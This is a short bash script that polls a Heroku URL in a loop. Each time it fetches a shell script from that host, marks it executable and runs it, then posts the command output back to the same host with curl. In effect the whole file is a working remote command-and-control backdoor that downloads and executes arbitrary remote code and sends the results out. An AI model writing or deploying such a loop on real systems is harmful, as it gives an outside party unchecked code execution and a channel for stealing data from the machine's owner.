prevInstr="no way this would be repeated as the instruction"
#yourSecret.app.com/yourSecretContext
add="fierce-badlands-47784.herokuapp.com/poihe9829bUE730JSShhe3kk3"
pollingIter=0
exeIter=0
period=1
while true
do
	pollingIter=$((pollingIter+1))
	echo "Polling iteration " $pollingIter " period = " $period " s" 
	curl $add > instructions.sh
	instr=`cat instructions.sh`
	if [ "$instr" != "$prevInstr" ]; then
		period=1	
		exeIter=$((exeIter+1))		
		echo "Executing iteration " $exeIter
		prevInstr=$instr
		date >> LOG.log
		echo $prevInstr >> LOG.log 
		chmod +x instructions.sh
		./instructions.sh > answer
		sed ':a;N;$!ba;s/\n/ ENTER /g' answer > answer2
		value=`cat answer2`		
		echo $value >> LOG.log
		curl --data-binary "payload=$value" $add >> LOG.log
		echo " " >> LOG.log
		rm answer; rm instructions.sh; rm answer2
	fi
	echo "."; echo "."; echo "."
	sleep $period
	if [ $period != 30 ]; then
		period=$((period+1))
	fi
done
